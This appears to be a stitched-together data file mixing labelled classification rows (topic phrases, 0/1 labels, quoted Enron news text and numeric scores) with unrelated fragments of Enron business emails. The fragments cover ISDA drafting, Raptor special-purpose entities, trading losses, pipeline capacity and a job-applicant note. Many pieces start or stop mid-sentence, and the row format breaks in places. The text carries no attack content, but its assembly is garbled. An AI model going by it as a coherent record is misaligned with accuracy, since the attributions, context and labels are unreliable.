it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"Some of the values in disarray in this case are visible to everyone. There is, for example the most obvious one: How did a company with assets of only a few hundred million dollars, or at most a couple billion, have a market value of $100 billion? This, of course, isn't Enron's fault, but ours. We're the ones who drove the stock price up over $100 at the height of the boom. We're the ones who actually believed that companies like Enron could, in our lifetimes, actually grow their earnings to justify such stratospheric, and historically unprecedented, multiples. Why did we believe it, despite all reason? Because we were greedy. Then there is the value crisis of the industry analysts, those morons who were still putting out ""buy"" notices on Enron even after it was apparent to even the most dimwitted observer that the companies was a dangerous house of cards. Either these people were perfect fools and dupes (which is precisely what they were hired not to be), or shills for Enron, or were covering their own investments. Whatever, they placed their own interests over the needs of their clients and the public at large. Next comes the cravenness of our elected representatives. So far, Enron's well-placed sacks of money seemed to have bought more largesse from the Clinton Adminstration than the Bush (big surprise), but that is hardly any consolation. The bottom line is that everybody Congress to the White House, GOP and Dem, took the money and then they took the calls. Do you think you could call the Treasury Secretary and get a prompt reply? Drinking the Kool-Aid Then, of course, there is the management of Enron. In certain areas I'm a little more sympathetic than most people to Kenneth Lay and his gang of idiots. I've spent my life around entrepreneurial teams, and I know well how important it is to believe the plan, to drink the Kool-Aid. You have to act like a billion dollar company even as the office equipment company is repossessing the furniture. I even understand why the company put such a large percentage of its own stock in the employee 401(k) plan: it thought it was doing the employees a huge favor. The employees thought so too - I don't remember any of them complaining about it when the stock was hovering around $100. But one thing was reprehensible: That was when Lay, after he knew the company was going down, still promoted the purchase of company stock to his own employees and to the world at large. That was an unforgivable moral lapse. If he was a man of honor he would personally buy back every share bought by employees and private investors in the days after that announcement. If he is financially destroyed in the process, too bad, that's what standing by your values is all about.

Powell.  Once approved, the confirm will be initialed by the reviewing 
lawyer, checked for credit and sent to the commercial person to review, 
approve and have executed.  The executed confirm will then be returned to 
either Linda or Sharon, who will attend to distributing it to the 
counterparty.  Again, this will only be required for transactions which are 
out of the ordinary.

With respect to negotiating and implementing, and addressing ongoing legal 
concerns with respect to, ISDAs on behalf of Enron Canada, Mark Taylor's 
group, and I understand specifically Mary Cook, will continue to have 
responsibility for such matters.  Therefore, to the extent that we need to 
put an ISDA in place with a counterparty or if a counterparty has legal 
concerns about the implementation of the ISDA, the process will be the same 
as it has been in the past, meaning that those matters will be dealt with in 
Houston.

Given that Linda and Sharon will now have responsibility for preparing 
initial drafts of atypical financial confirmations, I think it is essential 
that Tana spend a few days in Calgary as soon as her schedule permits to run 
each of Sharon and Linda (as well as perhaps some of the people in Peggy's 
group who will be dealing with financial confirmation matters) through her 
ISDA training course and to help Linda and Sharon set up the process in our 
legal group to deal with these matters.  As well, we will need to ensure that 
Linda and Sharon receive (either from Houston or Dianne) electronic versions 
of all confirmation precedents (ie. confirm forms, amendment forms, etc.) 
necessary for them to properly undertake these activities.

If anyone has any questions or concerns regarding the above, please do not 
hesitate to contact me.  Otherwise, I think we should implement these 
procedures as soon as possible, including having Tana join us for a few crisp 
winter days in Calgary.

Thanks

I just checked our first presentation to them, and it didn't have the ""confidential stamp on them.  Ideally, we'd like to have that covered, but don't think it is critical if the information there is not.

Going forward, I believe our revised proposal already has the stamp on every page.  If not, we will ensure that it is marked.

Subject: Confidentiality Agreement


Suzette,

    Pursuant to our conversation of earlier this afternoon, I am attaching a revised version of your proposed confidentiality agreement. The revised version is in Word format and my suggested changes are highlighted as you requested in your 10/19/01 email transmitting the proposed agreement.
    My first change is at the end of paragraph 2. It addresses my concern that any documents you give us that you consider confidential information will be so marked on every page, while taking our conversation into account and allowing other nonwritten confidential information provided to be covered as well.
    The next two changes are the typo we discussed in paragraph 3 and an additional sentence at the end of that paragraph. The sentence is added simply to recognize the need for timely provision of a Public Disclosure Copy in a regulatory or court proceeding.
    Finally, I have added the phrase found at the end of the first sentence of paragraph 7 to the end of the third sentence of that paragraph. I believe this addition is consistent with Enron's intent, but makes it more explicit.
    I plan to be in the office until about 7:00 pm EDT this evening and until about 2:30 pm tomorrow, and I will be happy to discuss my proposed changes with you and your attorneys at any time during that period.

Best Regards,
Butch

But investors counting on these gains could be in for a jolt down the road. Shares of these companies have been on a tear lately. And some of the biggest players are in Houston, the center of the energy-trading industry. Dynegy Inc.'s stock is up more than fourfold so far this year at $53.438, and now trades for 41 times what analysts project the company's 2000 earnings will be, according to First Call/Thomson Financial. Shares of Enron Corp., the largest trader of gas and electricity in North America, have nearly doubled this year to $84.875, or 60 times earnings. Meanwhile, El Paso Energy Corp.'s stock has jumped 61% this year to $62.375, or 24 times earnings.Traders at these and other companies are capitalizing on the wild price swings and supply fluctuations that have accompanied deregulation in some regional markets. Natural-gas prices have more than doubled in the past year, while supplies have tightened. And the rapid price fluctuations for electricity have prompted many large businesses to seek price protection through hedging or fixed-price contracts, generating large premiums for traders. But what many investors may not realize is that much of these companies' recent profits constitute unrealized, noncash gains. Frequently, these profits depend on assumptions and estimates about future market factors, the details of which the companies do not provide, and which time may prove wrong. And because of minimal disclosure standards in these kinds of cases, it's difficult for investors to assess whose assumptions might be too aggressive, or what market changes might invalidate the assumptions -- and force earnings revisions.",0.3,0.2,0.3,0.2

 ""We're not about to call off the dogs,"" said the governor, a
Democrat who will seek re-election next year.

 Duke, based in Charlotte, N.C., is a major investor in
California's wholesale electricity market, having spent more than
$1 billion since the state opened its generating plants to outside
operators in 1996.

 It is also near the top of the list of companies accused of
overcharging. Duke has been ordered by federal regulators to
justify or refund $20 million in disputed charges this year, an
amount that is third-highest among federally regulated companies in
the California market.

 By entering secret negotiations with Mr. Davis and being the first
generator to settle, Duke could gain a public-relations advantage,
in much the same way that the Liggett Group donned a white hat by
being the first company to open talks with the state governments in
the tobacco-litigation wars.

 ""We've just simply tried to be part of the solution,"" Richard B.
Priory, Duke's chairman and chief executive, said in an interview,
adding that the company was ""offering ideas"" and ""throwing in
suggestions.""

 Publicly, Mr. Davis has disparaged out-of-state electricity
generators before and after he began talking with them privately.
In an interview two weeks ago with The Los Angeles Times, he called
the generators ""the biggest snakes on the planet Earth"" for their

 California's electricity costs have risen to about $28 billion
last year from $7 billion in 1999. By some estimates, they could
approach $70 billion this year =01* $2,000 for every resident. The
state has stepped in to buy power for financially crippled
utilities, including Pacific Gas and Electric, which is now in
bankruptcy court.=20

 The Davis administration has struck power deals with companies
like Duke in hopes of securing a stable and affordable source of
power. To pay those bills, Mr. Davis is seeking the largest
municipal bond issue in American history, $12 billion, although
some state officials privately estimate that the final amount will
be higher.

 The governor hopes the bond issue will eventually take the state's
taxpayers off the hook. But how those costs are allocated among
ratepayers, utilities and generators, and whether the bond issue
can even succeed, remain unanswered questions. A major impediment
to resolving the electricity crisis, according to state officials,
utility executives and economists, is the secrecy surrounding the

Dear Jeff,

You may recognize my name as a member of the Houston YPO chapter.   We met briefly at the April technology program, which by the way, was fascinating.
I
  read in the Houston Business Journal of the San Francisco pie incident and thought your follow-through on the speech was perfect.  Look at the bright side, you're in great company!

I'm writing to solicit your advice on how my business can best capitalize on the ever-changing energy business.  As some background information, I'm responsible for a group of companies that are primarily in the businesses of manufacturing, personalizing and mailing laser printed billing statements and credit cards.   Personix is an industry leader in the markets we serve and Enron is a larger user of the types of services our company provides.   At the present time, we do not do business with Enron.

I've read where Enron has established an electricity retailing operation in anticipation of the Texas electricity market deregulation.  We would like to discuss with the appropriate person in your organization how our billing statement solutions may be of interest to Enron for your various energy and broadband businesses.

I would appreciate it if you could pass our name along in order to advance these discussions.   Thanks and look forward to seeing you at the next YPO event.

Also, some corrections are needed in our Alliance model.  Further research
shows that the maximum receipt capacity from B.C. to be about 300 / day
(9,120 / month) and from A.B. to be 1,950 / day (59,280).  Alliance
receives no supplies in the Northwest Territories and has no plans for
doing so.  The only existing connection to NWT is into Westcoast.  I would
change its capacity to 400 / day (12,160 / month), increasing to 500 / day
(15,200) in 2002.  Nova (TCPL Alberta System) is considering an extension
into NWT in the future.  The current base case shows a need for more than
500 / day starting in 2006.  So, I've set up a supply link from NWT into
Nova at 300 / day starting in 2006.


Pollution Credits Shutting Down California Power Plants

    AES says output from three of its power plants in southern
California has been cut in half due to a shortage of pollution
credits. AES Pacific has curtailed 2,000 MW of a total capacity of
4,000 MW at its three natural-gas fired plants in the Los Angeles
area, Alamitos, Huntington Beach and Redondo Beach. The move followed
the filing of a petition by the South Coast Air Quality Management
District related to its Alamitos plant which had exceeded its NOX
emission allocation. Both Huntington Beach and Redondo Beach were
close to reaching their NOX allocations. The plants could operate if
the California ISO declared a power emergency.  An arbitration board
is due to rule in late December on the air quality district's
petition. California has been struggling to meet surging demand for
power this year. There have also been few power plants built during
the last decade and the California ISO has had to issue numerous
power alerts this year as operating reserves dropped to critical
levels. The California ISO says a number of other plants are also
running out of pollution credits.

project, agreed earlier this month to buy Coastal's pipeline. Terms
were not disclosed. Coastal's purchase was for the 36-inch diameter

The topic of intangibles was thesubject of extended debate among FASB's seven members as they weighed itsimportance in allocating staff resources to such a project or to two otherissues vying for the attention of rulemakers. FASB heard arguments from one board member, John Wulff, suggesting that aneffort to simplify and codify standards and other guidance that formstatements of generally accepted principles, together with writing standardson revenue recognition and defining liability, may be more suitablecandidates for rulemaking. Major U.S. corporations, through at least onetrade group, the Institute of Management Accountants, counseled the coursedescribed by Wulff, a former leader of Financial Executive International'sCommittee on Corporate Reporting. That committee opposes FASB's taking onthe performance reporting and intangibles projects as outlined in aprospectus issued about two months ago. FASB settled on a compromise plan offered by board Chairman Edmund Jenkins.In the compromise, the panel's staff will carry out further preparatory workon intangible assets. At the same time, FASB's staff will study the threepotential projects--revenue recognition and liability definition,simplification and codification of accounting rules, and disclosures aboutintangibles--with an eye toward deciding an appropriate use of staffaccountants' time. The additional work on intangibles is to focus onsummarizing existing research on such non-concrete assets as in-processresearch and development, patents, and customer lists, with particular focuson questions about what information on intangibles is useful to investors,security analysts, and other users of financial statements. FASB would notcarry out polling or surveys, the board emphasized. The board tentativelyset a deadline of Dec. 24 for completion of the two-pronged work by itsstaff. That timetable would suggest FASB plans to make a more definitivedecision on adding a second, or even a third, standard-setting project inearly 2002.",0.0,0.0,0.8,0.2

However, my understanding is that the positions and VaR are captured in European Gas and UK Power, but the P/L is reported separately in ""Structured Derivatives"". This reporting is perhaps further complicated by related prudencey being released in the line item European Gas. The 12/5 DPR reflects a ($43MM) loss in Structured Derivatives, and Oliver indicated this represents the market moving against our Eastern spread option position. This is a Ken Lay level notification by any measurement standards, regardless of whether you compare it to the $7,500 VAR limit for Gas, or the $15,300 VaR limit for UK Power. Or even split it between them.Chris, please include this loss in today's notification letters to Ken Lay and Jeff Skilling for the 5th.

Sara/Mary,

I very much appologise for taking some time with regards to a reply on the 
credit issues for the ISDA.

With regards to your question on whether ETOL is prohibited from entering 
into Swaps with other parties - I actually do not have the answer to that 
question so I cannot comment on that.

I have looked at the documents and I would like to in as much as possible 
replicate the terms we have with ETOL in the ECT ISDA. I cannot see any 
reason not to go with the same structure as we have in that ISDA. We will 
provide an Enron Corp guarantee in favour of ETOL as well as have a $50M 
collateral threshold (like in the previos ISDA). I further assume that we 
should roll up any outstanding ISDA confirmations with this counterparty 
under this ISDA. With regards to the cap on the Enron guarantee - this is set 
as 10,000,000 for the previous ISDA. Again here I think we can go for the 
same amount.


Please give me a call if you have any questions and we can discuss,

Kind Regards,

karolina

Rod or Karolina will prepare a credit worksheet for an ISDA Master Agreement 
between ETOL and RMT.  Jorge has a 3-year rate swap awaiting documentation.

Rod/Karolina:  Is there any reason to not use RMT?  Is an ETOL sell-off 
imminent?  If so, would it be in the near term?

Rhett:  If an ETOL sell-off (in whole or part) is imminent, should the deal 
be booked in ENA rather than RMT?

Hello Andy.

I hope your Monday is going well. Per our discussion last week, I have
communicated to our management your limited availability for this project.
Hopefully we will resolve this issue in the upcoming week. Our plan is to
request additional resources to help you write the content. However, you
will still be responsible for signing off on the final product. I will keep
you updated with more information as soon as I know more.

In the meantime and until we've identified additional resources, I am
sending you  the high-level outline for each content area that you are
responsible for this week. Let me know if you have time to complete this,
or any other past assignment. I've included reminders below on where/how to
develop.  Thanks.

Login: alewis


This Week's Assignment: This week's assignment will be to write about each
of the following areas:
1) Market Valuation (Page 1_5_4_1-   in the Swaps topic)
2) Cross-Commodity Swap (Page 1_6_6_1 - in the Swaps topic)

Due Date: Friday, November 2nd, 2001

Outlines to Help Guide You When Writing
Market Valuation (Forwards)
<<Andy - This section should provide examples/scenarios to the learner to
help better explain how market volatility impacts P&L when using Forwards
Contracts>>
   Short in the forwards market: rising prices result in losses and
   decreasing prices result in profits
   Long in the forwards market: rising prices result in profits and
   decreasing prices result in losses

Cross-Commodity Swap
<<Andy, this is a larger section. You can copy/paste most of the
information regarding cross-commodity swaps from the BRM course material
that we sent you.>>

   Definition of differenty types of cross-commodity swaps:
     Crack Spread Swap
     Spark Spread Swap
     Btu Swap
   Constructing a cross-commodity swap
   Examples/scenarios with Monthly cash settlements

Finally and most importantly, please keep in mind that the completion of
these assignments significantly impacts the the ability of our BRM project
to stay on schedule and within budget. If you are unable to complete this
assignment, please notify me ahead of time and provide an estimated time
for completion.

Good morning,

Just a heads up to let you know that there is a new product type awaiting 
your approval (currently ""Partially Approved"") in EnronOnline Datamanager. It 
is an Australian power financial spread product (#2001) and will be an 
inter-regional spread using the existing financial power swap products i.e. 
VIC, SA, NSW & QLD peak & flat products as the underlying contracts.

Our senior legal counsel in the Sydney office, David Minns, has indicated 
that the existing GTC for Australian power products (see attached) can also 
be used for this new product type.

I would appreciate it if you could review this as soon as possible. Please 
let me know if you require anything further.

Note, a sigma factor (4.07) has been assigned by RAC which will be amended 
after the product type has been approved.

RANDOM,0,"Subject: Prudential's Gas Market/Price Forecast

Prudential Sees Bull Market Running Two More Years

With gas futures prices soaring past $5, now is not a bad time to raise price 
forecasts and expectations for the coming winter and next year. Prudential 
Securities did just that yesterday, upping its predictions on spot wellhead 
prices to $4.10 for the second half of the year, $3.55 for all of 2000 and 
$3.65 for 2001. 

""[W]e believe the natural gas industry could continue its bullish run for 
another two years or more and the next 18 months look like a 'lay up,'"" the 
investment banking firm said in its latest quarterly report on natural gas 
fundamentals. Below average storage inventories and increasing gas-fired 
electric generation demand should keep the bull market running, the report 
stated. 

Prudential expects storage to end the injection season at about 2,660 Bcf, or 
11% below last year's level. ""This is assuming that the average injection 
rate is at or above the eight-year historical average during that period, and 
so far this year refills have been at or below the historical average. 
Depending on the winter weather, the industry typically consumes 2,000-2,500 
Bcf out of storage inventories, which would likely bring storage levels down 
close to record lows next spring."" 

Prudential expects supply tightness to continue even with the addition of the 
1.325 Bcf/d Alliance project, which is due to come on line next month. ""[W]e 
question whether the Alliance pipeline will add incremental supplies to the 
U.S. or simply displace gas supply out of the Alberta region currently 
flowing down the TransCanada pipeline system."" Prudential predicts Alliance 
will open up Oct. 2 with 600-700 MMcf/d of gas flowing. ""The perception of 
the continued tightness in the gas supply picture is likely to result in an 
increase in volatility in natural gas prices."" 

Prudential also estimates that 1.5 Bcf/d of gas demand has been added this 
summer by new gas-fired power plants going on line. ""Over the past few weeks, 
over 2,400 MW of new merchant capacity has been added to the grid, equating 
to about 480 MMcf/d of capacity. Earlier in the summer, 3,600 MW came on line 
and another 1,780 MW started up in May. In aggregate, about 7,800 MW of new 
summer generation load could collectively consume 1.5 Bcf/d, which is likely 
to be diverted from storage injections."" 

The firm estimates that wellhead deliverability will pick up significantly.

   After quickly looking at invoices since Jan 2000, it appears the
   majority of
   the problems started to occur in early 2001. There are only small
   rounding
   differences occurring in 2000. It also looks like there were several

   where MCV overpaid the Enron invoice to comply with the contract price.

Debt Rating Agencies Considering Reforms


    Following complaints by investors, analysts and lawmakers that
Moody's, S&P and Fitch were too slow to downgrade Enron, the credit
agencies have all said they are considering reforms that would speed up
their review process for altering a company's ratings. The changes could
lead ratings to become more volatile and affect stock and bond prices. It
could also raise the cost of  borrowing for companies that need cash.
Fitch and Moody's have said they may eliminate outlooks, meant to be a
guideline of a rating's possible future direction. There will now be more
rating changes that are multiple notches and corporate ratings will become
more volatile and lower than they have been over the last decade. The
agencies have already changed their criteria for the assessment of a
company's ratings. All are taking a closer look at rating triggers and a
company's ability to raise needed cash. This month, the agencies
downgraded Kmart, which has now filed for bankruptcy, several notches in a
matter of days. Moody's rated Kmart's debt as investment-grade a little
more than a month ago. Moody's put Calpine on review for only one day
before lowering its debt rating. It also kept Ford on review for only 5
days before downgrading its debt. The effects of the Enron collapse could
hurt other companies facing a cash crunch by subjecting them to more
stringent scrutiny. S&P said it is focusing more on movement in a
company's stock and bond prices.

Mike, 

Please find attached  a status and time line of doorstep issues identified by 
Shona Wilson and the RAC group.

Note that some specific implementation dates have not been provided by 
responsible parties a of today.  I have asked respective responsible parties 
for specific dates and will update schedule attached as I receive the 
information. 

Further note that IT drives many of our critical dates.  Since our last 
meeting we have been advised that any AS 400 system changes will not be 
considered top priority as the IT team will focus on the off balance sheet 
financing that must be in place by calendar year end.  Also, with the London 
SAP implementation pushed off until April 2001, the credit aggregation system 
will not be available until such time.

Please let me know if you have nay questions or comments to the attached.

Thanks for the meeting yesterday - I think the process does improve the 
transparency and accountability of issues raised. 

After the call I mentioned to Ted that the meetings might be 'more efficient' 
if the specific issues identified during doorstep visits - that underpin 
report comments - were validated by the direct controller on 'point' for the 
office/business - in this case Marcelo. Ted replied that no harm came from 
the current approach and to a certain degree I agree that it is good to get 
an immediate collective response to issues raised !However, I thought we 
could discuss this for future meetings ( it could be part of the 'how to do a 
doorstep review' that my guys requested so they are ready to do their 
individual reviews next year ) -will call later

Additionally, I thought I would confirm with you the actions I took down

So far this quarter we've spend about 18 million on a reserve that Randy Petersen/Credit are making us take on an option we have associated with the MTBE project.  In essence, Randy P doesn't understand how we trade options at Enron, and I'll be having a conversation with Rick about this.  We've spent almost 5 million in getting out of physical positions since no one will buy from or sell to us.  We can't manage the physical positions and obligations we have since there is no money available to the crude group (to purchase physical or post LC's in the case of a sale).  Wev'e also spent about 10+ million closing down books and getting out of positions as the market gives us the chance.  More than half the books have been closed and we will close/consolidate four more tonight.  As you know, getting out of any positions costs money, and the market smells blood.

Because the crude and products markets have been moving significantly recently, we can't manage our options position by getting out of them.  Again, nobody will buy from us or sell options to us, so we have to try to neg. gamma trade it.  

That is the 30 second version of the cluster I'm trying to close, hope it helps.

Criminal charges may still be in store for top Enron executives, who sold nearly $1 billion worth of their company stock, possibly knowing it was improperly inflated, before it plummeted. Thousands of employees were not so lucky, and lost their lifetime savings. Close to 60 percent of all employee 401(k) money was tied up in Enron stock. Congress should consider a proposal by Senator Jon Corzine to cap the percentage of employees' retirement accounts that can be held in company stock. The third issue that Congress and the S.E.C. need to address is the lack of public confidence in financial reporting. Beyond Enron's questionable behavior, the most alarming failure of all may have been that of its outside auditor, Arthur Andersen, to flag the company's dubious accounting practices. Enron is only the latest and most dramatic instance of an accounting firm's failing to protect the public from largely fictional financial reporting by a major company. The accounting industry insists it can regulate itself, but the evidence points to the contrary. Firms have placed themselves in an untenable conflict of interest by providing the same companies they audit on behalf of the public with an array of consulting services. Congress ought to pass legislation to bar such conflicts. Unsuspecting Enron employees were the most direct victims of the company's lack of forthrightness, but overall investor confidence in the integrity of the marketplace took a serious hit with Enron's demise.

raptor creation of special purpose entities,1,"1.) V&E is currently drafting documents to allow each Raptor structure to look to the other structures in terms of credit capacity. 2.) The previously proposed assignment of the LDC swaps from Raptor II to Raptor IV is off the table. These swaps will now be terminated.3.) Either Raptor II or Raptor IV will be used to hedge the Mariner investment ($360M) instead. 4.) The JEDI structure is expected to be unwound thus allowing 12M Enron Corp. shares to come back to Enron Corp. and no longer be treated as issued and outstanding for purposes of Enron's EPS calculation. 5.) The value of 12M new Enron Corp. shares would be used to capitalize either Raptor II or Raptor IV (12M shares x $70 = approx. $840M).  a.) As consideration for the contribution of the shares, the receivable owed by the lower tier LLC to the Enron member under the grid note would be increased by the same amount. b.) The credit capacity of the subject Raptor structure would increase by an amount equal to the discount on the shares caused by their restricted nature. ($840M x 35% to 45% = approx. $294M to $378M)  c.) Ryan has apparently suggested that the shares actually be transferred to a trust and that the trust issue a forward contract on the shares to the chosen Raptor structure. We have some concerns about this approach from a tax perspective. I would like to better understand the benefits of using a forward contract, who would own the beneficial interest in the trust, and what follow-on transactions might be planned regarding the trust. d.) I am still confused about the characterization of the contribution of the additional shares as utilizing the credit capacity of the Raptor structure to which they are contributed. I can understand why the shares would not increase the credit capacity of the structure, but I am told that the potential downside on the Enron stock would actually utilize the structure's capacity.

SECURITY AND BUG PATCH ALERT
03/06/00

Dear Wincenty Kaminski,

---------------------------------------------------------------
By Jason Meserve

Welcome to the Security and Bug Patch Alert newsletter!

Given the recent spate of high-profile denial-of-service and hack
attacks and the large number of people who have signed up for this
newsletter before this first edition has been even published, it is
clear that security is a major concern in the IT community  as it
should be.

With technology now being looked upon as a profit rather than cost
center, IT departments face more pressure to keep critical systems up
and running  as well as secure. No chief information officer or network
manager wants to have to tell the CEO that their e-commerce site has
been broken into and customer credit card data copied. Stories like that
tend to stick in a potential customer=01,s mind more than an expensive
Super Bowl ad.

It=01,s hard enough to keep up with the latest new technologies, never mind
latest security patch for your operating system or e-commerce
application. But we=01,re here to help.

Once a week we=01,ll publish a list of patches and alerts from all the
major vendors and security organizations with links to the source. We=01,ll
also provide other (hopefully) useful resources for the security-
conscious IT manager.

Comments and suggestions are always welcome! Send mail to


Now on with the latest patches and alerts:

Daren and Lauri:

We do have a problem with some of our mirrored meters.  When MIPS receives an 
""incomplete"" from the parent meter it sends a -0- to POPS.  Yes, this is a 
big problem.  Our POPS team (Romeo D'Souza) has identified this problem and 
notified MIPS.  However, he was told this was not a priority item.   In the 
mean time we are overriding the volumes in POPS with the estimated volumes.

This particular meter was correct last night, the 14th rolled last night from 
MIPS and overrode the BAV with a -0- from day 14 forward.

This was corrected this morning and the meter re-allocated.

Thanks,

Subject: PG&E Texoma Volumes

In reviewing some of the imbalance numbers, I discovered that Valero Texoma 
(#71) BAV volumes have not fed into POPS since 3/14 causing an out of balance 
at the meter in excess of 500,000mm month to date.  The more critical part of 
this problem, however, is that POPS has fed 0 volumes back to Sitara on some 
of the HPLC deals.  This means that these purchase volumes (expenses) have 
not been picked up in Tom's P&L and are, instead, sitting in UA4.  To the 
extent that the purchase prices vary from the UA4 value, the P&L may take a 
hit when these actual volumes flow through.

I realize that Kim is out and that you guys are stretched thin, however, a 
problem of this magnitude needs to be addressed as soon as it's discovered.  
Someone needs to be overriding the 0 volumes so that Sitara is receiving 
correct information and the P&L is kept as accurate as possible.

Please give me a call if you have any questions.

record keeping accounting practices,0,"LONDON -(Dow Jones)- Issues bedeviling the accounting profession for years have finally flashed into the headlines, thanks to Enron and the bursting of the Internet bubble.Unhappily, most are unlikely to be solved anytime soon. Questions of auditor independence and the use of pro forma statements are at the fore. Not far behind are ones on accounting for options and goodwill. And then there's the issue of which standards to use. Right now, ""who guards the guardians"" has leapfrogged to the top of the agenda. The Enron collapse shows that auditors need to be more independent. It's a thinly-disguised fiction that auditors are paid by and act on behalf of shareholders. Clearly, it's corporate management doing the hiring and firing of auditors. And audit itself makes little profit. Instead, accountants rely on consulting and more technical or specialized practices, like M&A, to generate fees. An accountant refusing to pass a company's results runs the risk of losing a big part of his own business. Even the risk of litigation isn't - or at least hasn't been pre-Enron - enough of a deterrent. What's the solution? Make sure companies that audit aren't swayed by conflicts of interest. Regulators should either encourage stand-alone audit firms or prohibit auditors from any other involvement with the companies they scrutinize - even if that's tricky for big international corporations, which can use all of the ""big five"" accounting firms in the course of a year's global dealings. Another dilemma is the issue of pro formas. There's a mounting consensus that pro forma statements are suspect. According to some estimates, pro forma results for S&P 500 companies during the third quarter overstated audited profits by 70%. Why should companies push their pro formas when, after all, there's a perfectly good U.S. audited accounting standard: the U.S. Generally Accepted Accounting Principles (GAAP)? Enron notwithstanding, surveys show investors are more confident with U.S. corporate results than those from Europe or Japan. And yet, U.S. GAAP has its own problems. U.S. accounting is rigidly based on rules, unlike elsewhere, where it's more a case of applying broad principles. Though these rules are designed to ensure standards, they're often subverted by loopholes. U.S. companies can comply with the letter of the law but still offer a distorted picture of fundamentals. The result is that while investors are flooded with information, it's not always helpful in determining a company's value. Enron highlighted one such loophole. The company went under in large part because it was taking on huge, unseen liabilities. These liabilities weren't on the balance sheet, having been planted on special vehicles nominally independent of the firm.",0.0,0.0,0.8,0.2

Harry,

I enjoyed our interview today and hope to continue discussions with Enron
about a summer internship.

I couldn't resist sending you this link.  I don't know if you recall, but
during our talk we conducted an exercise attempting to determine new uses
for tissue.  I was surprised to learn that Kimberly-Clark has just announced
a new product.  They actually were holding a analyst conference call this
morning to discuss earnings and their new venture.  Your questions are
certainly very current!  I wish I had been creative enough to think of this
product during our interview.

Here is the link.

Again, thank you for taking the time to interview me.  I am excited about
the opportunities at Enron and look forward to continuing our discussions in
the next few weeks.

Sincerely,

Vic

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"ENRON IN CRISIS - Restated figures show how earnings were cut - SEC FILING - Energy trading group admits that several of its special-purpose entities should have been consolidated on the balance sheet. Enron yesterday marked four years of earnings down sharply after taking account of off-balance-sheet dealings.The company admitted that several of its off-balance-sheet, special-purpose entities should have been consolidated on its balance sheet. The effect of the change was to reduce earnings substantially in each year from 1997 to 2000; from $105m to $9m in 1997, from $703m to $590m in 1998, from $893m to $643m in 1999 and from $979m to $847m in 2000. This year's earnings were marginally increased but the company's third-quarter loss widened marginally from $618m to $635m. In the Securities and Exchange Commission filing, Enron also announced the dismissal of two more officials: Ben Glisan, the company's treasurer, and Kristina Mordaunt, general counsel for one division. Enron ran into trouble on October 16, when it announced a $1.2bn reduction of shareholders' equity and a $1.01bn charge. Yesterday's filing goes some way to explaining how the charge came about. Enron attributed the charge to dealings with LJM, a private equity fund run by Andrew Fastow, formerly Enron chief financial officer. Private equity investments have injected enormous volatility into the earnings of companies, such as JP Morgan Chase. Keeping LJM off the balance sheet allowed Enron to avoid major swings. But to prevent LJM being consolidated, Enron had to own less than half of the special-purpose vehicle, and for outside investors to participate they had to be compensated. What that meant was that when the value of Enron's private equity investments fell below a certain level, people familiar with Enron's balance sheet said, co-investors would receive Enron stock. The Enron filing reveals that the LJM losses arose from another group of special-purpose entities, known as the Raptor vehicles, which were designed in part to hedge an Enron investment in a bankrupt broadband company, Rhythm NetConnections. The $1.2bn reduction in shareholders' equity arose from the termination of the Raptor hedging arrangements, which if they had continued would have resulted in Enron issuing 58m shares to offset the company's private equity losses. Enron also revealed that Mr Fastow was paid in excess of $30m as a result of his role in running LJM. At issue is whether Mr Fastow was acting in the best interests of other Enron shareholders. The filing also raises questions about Enron's cash flow, which will be studied carefully by the rating agencies and creditors. A group of banks, including Barclays Bank, Credit Suisse First Boston, Deutsche Bank, JP Morgan Chase and Citigroup, have lent more than $4bn to Enron over the last weeks, much of it not collateralised.",1.0,0.8,0.9,0.2

Subject:	State Licensing/Utility Agreements

Gloria, Jim and Harry;

Thanks for pulling us all together on Monday. We look forward to working with your group on merging the State Licensing and Utility Agreements into a common area, in order to keep the organization informed and up to date.

I wanted to re-cap just a bit.  The Services Group has state licensing responsibility for Gas and Power for EESI and EEMC. We handle new licensing and renewals.  We are on an ""auto-reminder"" distribution from EES legal, Heather Mathis for renewals/reporting.  We physically house all documentation relating to licensing on our floor. We currently publish and distribute as needed State License status report which identifies where we are licensed and what our license # is.  The Services Group works directly with Gloria for utility agreements, as we are one of many groups who she obtains sign-off from and/or information in order to execute agreements and State Licensing information is critical to her processes.

Gloria and I met yesterday to discuss next steps.  We are working together to provide the following.

1) Matrix of Executed Agreements which includes: State, License #, UDC, Agreement Type, Signatory, Date Issued, Expiration/Renewal, Security Requirements. (2 Weeks)
2) Backfill each groups need for documentation - provide copies of State Licenses and/or UDC agreements. (2 Weeks)
3) Identify the EES/ENE contacts sent to the State/UDC, update as needed, internally and externally. (2 - 3 Weeks)
4) Provide Summary information regarding State/UDC that can be placed on EES Market Central (2-3 Weeks?)
5) Ensure information is updated, published, organized and accessible to all interested parties. - Gloria has initiated creating binders that will be housed on the 47th floor - we will encompass State information with the executed UDC agreements. 

Gloria, please feel free to add anything I have overlooked.  I've attached the contact list currently used when obtaining State Licenses. This",0.0,0.0,0.7,0.2

be passed by August 15.

For ratemaking purposes the CPUC will grant SCE a 11.6% ROE on its generation 
and distribution rate base.

Questions and Answers

What was expected timing of return to investment grade for SCE?
Up to the rating agencies.  Many steps to go through.  It is assumed agencies 
will be following closely but timing is uncertain.  Would have to be before 
utility resumes power procurement obligations.

Applicability of 11.6% ROE?
ROE would increase from current 7% ROE to level no less than 11.6% for both 
generation and distribution assets on unamortized balance at 12/31/00 and 
capital structure roughly at 50/50.

Potential for write-offs?
While plan calls for full recovery of net undercollections as of 1/31/01, 
because of timing issues SCE may take a write-off then have a ""write-up"" at a 
later date.

Interest in how/why/impact of inclusion of Mission Sunrise generation project 
(investor concern over market v. regulated returns)?
The state was looking at all options for long-term power contracts.  Market 
returns traded for security of long-term contract.

What will be source for $3 b capital investments over next 5 years?
Capital would come from retained earnings, borrowing and additional 
investments from holding company.

Concern over ability of existing rate level (and ""waterfall"" disbursement) to 
recover all costs especially if CDWR procurement costs increase?
 Existing rates should cover all costs.  Provisions in MOU allow adjustment 
to rates to maintain investment grade status.

What was gained from MOU as opposed to pursuit through the courts?
Speed and certainty with respect to resolution of outstanding issues. 

Will the sale be a taxable event?
Yes.

What is the URG unit cost?
$.042 per kwH.

In 2003 would SCE have ability to replace contracts of CDWR (when SCE resumes 
procurement role)?
SCE would have ability to enter into new contracts, but would not ignore 
obligations under CDWR contracts.  New contracts would be subject to PUC 
prudence review.  SCE would file procurement plan with the PUC.

Jason, 

Maybe this will clear things up a little:

